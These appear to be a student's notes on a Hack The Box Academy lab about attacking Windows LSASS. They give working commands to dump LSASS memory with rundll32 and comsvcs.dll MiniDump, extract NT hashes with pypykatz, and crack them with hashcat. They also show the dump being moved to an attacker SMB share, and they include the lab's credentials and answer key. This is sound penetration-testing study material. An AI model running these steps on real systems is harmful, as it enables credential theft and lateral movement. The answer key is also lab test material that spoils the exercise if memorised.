# Attacking LSASS
LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory.

![alt text](lsassexe_diagram.png)

Upon initial logon, LSASS will:
- Cache credentials locally in memory
- Create access tokens
- Enforce security policies
- Write to Windows' security log

## Dumping LSASS process memory
Similar to the process of attacking the SAM database, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump.

### Task Manager method
With access to an interactive graphical session on the target, we can use task manager to create a memory dump. This requires us to:

1. Open **Task Manager**
2. Select the **Processes** tab
3. Find and right click the **Local Security Authority Process**
4. Select **Create memory dump file**

A file called `lsass.DMP` is created and saved in `%temp%`. This is the file we will transfer to our attack host. 

### Rundll32.exe & Comsvcs.dll method
This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.

Before issuing the command to create the dump file, we must determine what process ID (`PID`) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:

```cmd
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```

or

```pwsh
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

Once we have the PID assigned to the LSASS process, we can create a dump file with an elevated Powershell session:

```pwsh
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`).

If we manage to run this command and generate the `lsass.dmp` file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.

## Using Pypykatz to extract credentials
Once we have the dump file on our attack host, we can use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials from the `.dmp` file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts.

The command initiates the use of `pypykatz` to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of the `Local Security Authority`, then we specify the data source as a `minidump` file, proceeded by the path to the dump file stored on our attack host. Pypykatz parses the dump file and outputs the findings:

```sh
masterofblafu@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```

### MSV

```sh
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the bob user account's logon session stored in LSASS process memory.

### WDIGEST

```sh
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

`WDIGEST` is an older authentication protocol enabled by default in `Windows XP - Windows 8` and `Windows Server 2003 - Windows Server 2012`. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default.


### Kerberos

```sh
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS caches `passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.

### DPAPI

```sh
    == DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

Mimikatz and Pypykatz can extract the DPAPI `masterkey` for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. 

## Cracking the NT Hash with Hashcat
We can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.

```sh
masterofblafu@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
<SNIP>
64f12cddaa88057e06a81b54e73b949b:Password1
<SNIP>
```

## Questions
RDP to **10.129.202.149** (ACADEMY-PWATTACKS-LSASS) with user "`htb-student`" and password "`HTB_@cademy_stdnt!`"

1. What is the name of the executable file associated with the Local Security Authority Process? **Answer: lsass.exe**
2. Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive) **Answer: Mic@123**
   - `$ xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.202.149` → RDP to the target machine with the given credential
   - At the target, dump the LSASS process memory (use an elevated Powershell session):
        ```pwsh
        PS C:\Windows\system32> Get-Process lsass

        Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
        -------  ------    -----      -----     ------     --  -- -----------
        1260      21     4948      15396       2.56    672   0 lsass
        PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
        ```
   - `$ smbserver.py -smb2support DATA /home/htb-ac-1863259/Desktop/` → At the attack host, start the SMB server to receive the `lsass.dmp` 
   - `PS C:\> move lsass.dmp \\10.10.14.225\DATA` → Transfer the dump file to the attack host for offline cracking
   - Use pypycatz to extract credentials from the dump file and crack it using hashcat:
        ```sh
        $ pypykatz lsa minidump lsass.dmp
        <SNIP>
        == LogonSession ==
        authentication_id 128868 (1f764)
        session_id 0
        username Vendor
        domainname FS01
        logon_server FS01
        logon_time 2026-02-23T02:52:45.722057+00:00
        sid S-1-5-21-2288469977-2371064354-2971934342-1003
        luid 128868
            == MSV ==
                Username: Vendor
                Domain: FS01
                LM: NA
                NT: 31f87811133bc6aaa75a536e77f64314
                SHA1: 2b1c560c35923a8936263770a047764d0422caba
                DPAPI: 0000000000000000000000000000000000000000
            == WDIGEST [1f764]==
                username Vendor
                domainname FS01
                password None
                password (hex)
            == Kerberos ==
                Username: Vendor
                Domain: FS01
            == WDIGEST [1f764]==
                username Vendor
                domainname FS01
                password None
                password (hex)
        <SNIP>

        $ sudo hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt
        <SNIP>
        31f87811133bc6aaa75a536e77f64314:Mic@123
        <SNIP>
        ```


